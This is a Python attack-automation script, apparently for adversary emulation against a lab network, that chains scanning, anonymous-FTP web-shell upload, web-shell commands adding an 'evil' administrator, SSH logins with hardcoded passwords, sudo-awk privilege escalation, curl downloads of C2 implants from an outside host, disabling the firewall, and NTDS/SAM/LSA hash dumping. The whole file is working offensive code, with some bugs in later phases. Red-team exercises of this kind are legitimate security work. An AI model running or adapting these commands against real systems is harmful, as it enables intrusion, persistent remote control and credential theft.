import subprocess
import time
import requests
import os
import sys
import paramiko


def check_root():
	# Check if the script is run as root
	if os.geteuid() != 0:
		print('Please run the script as root (using sudo).')
		sys.exit(1)
		
def execute_ssh_commands(username, password, host, commands):
    # Create an SSH client
    client = paramiko.SSHClient()

    try:
        # Automatically add the server's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the SSH server
        client.connect(host, username=username, password=password)

        for command in commands:
            # Execute each command with the password
            full_command = f"nohup {command} > /dev/null 2>&1 &"
            stdin, stdout, stderr = client.exec_command(full_command)

            # Print the output
            print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")

    finally:
        # Close the SSH connection
        client.close()

def phaseOne():
	# Define attack space 
	subnet = "208.11.26.0/24"
	target_ip = "208.11.26.100"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	subprocess.run(["fping", "-g", subnet, "-a"])
	# Wait for 3 minutes
	print("Waiting for 3 minutes...")
	#time.sleep(180)
	# Run nmap with aggressive scanning and no ping against the target IP
	print(f"Running nmap against the target IP {target_ip}")
	subprocess.run(["sudo", "nmap", "-A", "-Pn", target_ip])
	# Wait for another 3 minutes
	print("Waiting for another 3 minutes...")
	#time.sleep(180)
	# Connect to FTP at the target IP using anonymous login
	print(f"Connecting to FTP at {target_ip} with anonymous login")
	ftp_script = """
	quote USER anonymous
	quote PASS anonymous@
	cd uploads
	ls
	put IPDS-Schema.aspx
	quit
	"""
	subprocess.run(["ftp", "-n", target_ip], input=ftp_script, text=True)
	print("FTP session ended")
	# use curl to emulate adversary enumeration
	whoami = "whoami"
	dir = "dir"
	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Cdont%5Fforget%2Etxt"
	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
	addAdminGroup = "net%20localgroup%20administrators%20evil%20%2Fadd"
	# Set up URL Encoded curl requests
	curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
	curltwo = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={dir}"
	curlthree = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}"
	curlfour = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}"
	curlfive = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}"
	curlsix = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}"
	# Execute requests
	subprocess.run(curlone, shell=True, text=True)
	subprocess.run(curltwo, shell=True, text=True)
	subprocess.run(curlthree, shell=True, text=True)
	subprocess.run(curlfour, shell=True, text=True)
	subprocess.run(curlfive, shell=True, text=True)
	subprocess.run(curlsix, shell=True, text=True)	
	print("Phase One is Complete")
	
def phaseTwo():
	subnet = "208.11.23.0/24"
	target_ip = "208.11.23.201"
	username = "ethan.reynolds"
	password = "bubblewrap69"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	#subprocess.run(["fping", "-g", subnet, "-a"])
	# Wait for 3 minutes
	print("Waiting for 3 minutes...")
	#time.sleep(180)
	# Run Crackmapexec for ssh on the target subnet 
	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
	#subprocess.run(cme, shell=True, text=True)
	# Initial SSH Connection, enumerate, and then perform privesc
	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://94.249.192.5:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/raichu &\")}'"
	commands = [
	"whoami",
	f"echo {password} | sudo -S -l",
	"pwd",
	f"echo {password} | {awkStage}"
	]
	client = paramiko.SSHClient()

	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		# Connect to the SSH server
		client.connect(target_ip, username=username, password=password)

		for command in commands:
			# Execute each command with the password
			full_command = f"{command}"
			stdin, stdout, stderr = client.exec_command(full_command)

			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Finish command loop and then run C2 Beacon in the background
		full_command = f"echo {password} | {awkC2}"
		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
	print("finished phase two tasks.")
	
def phaseThreept1():
	# Users ethan.renolds, backup, Kenneth.Mcneil, Alta.Dudley, Quentin.White, and Blake.Hayness added to 23.201
	# ethan.reynolds - bubblewrap69, backup - michaelwashere Kenneth.Mcneil - password123, Alta.Dudley - hellokitty, Quentin.White - qweasdzxcQWEASDZXC, Blake.Hayness - qazwsxedcQAZWSXEDC
	subnet = "208.11.25.0/24"
	target_ip = "208.11.25.204"
	crackedUsers = "usernames.txt"
	crackedPasswords = "passwords.txt"
	username = "backup"
	password = "michaelwashere"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	#subprocess.run(["fping", "-g", subnet, "-a"])
	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
	#subprocess.run(cme, shell=True, text=True)
	commands = [
	"pwd",
	"curl http://94.249.192.5:8000/pspy -o /tmp/pspy",
	"chmod +x /tmp/pspy",
	"cd /var/log/mon",
	"curl http://94.249.192.5:8000/backup.sh -o /var/log/mon/backup.sh"
	]
	client = paramiko.SSHClient()
	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		# Connect to the SSH server
		client.connect(target_ip, username=username, password=password)
		for command in commands:
			# Execute each command with the password
			full_command = f"{command}"
			stdin, stdout, stderr = client.exec_command(full_command)
			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
		
def phaseThreept2():
	target_ip = "208.11.25.204"
	username = "backup"
	password = "michaelwashere"
	print("starting part two..")
	sliverC2 = "sudo /root/lucario &"
	commands = [
	"rm -rf /var/log/mon/backup.sh",
	"sudo systemctl stop firewalld",
	"curl http://94.249.192.5:8000/lucario -o /root/lucario",
	"chmod +x /root/lucario",
	]
	client = paramiko.SSHClient()
	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		# Connect to the SSH server
		client.connect(target_ip, username=username, password=password)

		for command in commands:
			# Execute each command with the password
			full_command = f"sudo {command}"
			stdin, stdout, stderr = client.exec_command(full_command)

			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Finish command loop and then run C2 Beacon in the background
		stdin, stdout, stderr = client.exec_command(sliverC2, timeout=5)
		print(f"Command: {sliverC2}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
	print("finished phase three tasks.")
	
def phaseThree():
	phaseThreept1()
	print("Finished Part One. Sleeping to allow cronjob privesc to run.")
	time.sleep(60)
	print("done. Executing part two.")
	phaseThreept2()
	print("Phase Three done.")

def phaseFour():
	subnets = [
	"208.11.20.0/24",
	"208.11.21.0/24"
	]
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet[0]}")
	#subprocess.run(["fping", "-g", subnet[0], "-a",">","alives.txt"])
	print(f"Running fping against the subnet {subnet[1]}")
	#subprocess.run(["fping", "-g", subnet[1], "-a",">>","alives.txt])
	print(f"Running nmap against the target IP {target_ip}")
	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])

def phaseFive():
	DC1 = "208.11.20.100"
	username = "administrator"
	password = "P@ssw0rd"
	commands = [
	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --ntds --obfs > ntds.txt'",
	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --lsa --obfs > lsa.txt'",
	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --sam --obfs > sam.txt'"
	]
	for command in commands:
		try:
			print(f"Running {command}. Sleeping for 30 seconds.")
			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
		except Exception as e:
			pass
	
	psCommands = [
	"iwr -uri http://94.249.192.5:8000/haunter.ps1 -out C:\Users\Administrator\Music\haunter.ps1",
	"C:\Users\Administrator\Music\SharpHound.ps1 -c All"
	"iwr -uri http://94.249.192.5:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe",
	]
	for commands in psCommands:
		try:
			print(f"Running {command}. Sleeping for 30 seconds.")
			# Add impacket-psexec command here.
			subprocess.run(f"impacket-psexec {username}:{password}@{DC1} powershell.exe -c "+command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
		except Exception as e:
			pass

def main():
	# Ensure Sudo Usage
	#check_root()
	# Run phaseOne function
	#phaseOne
	#phaseTwo()
	#phaseThree()
	#phaseFour()
	phaseFive()

if __name__ == "__main__":
	main()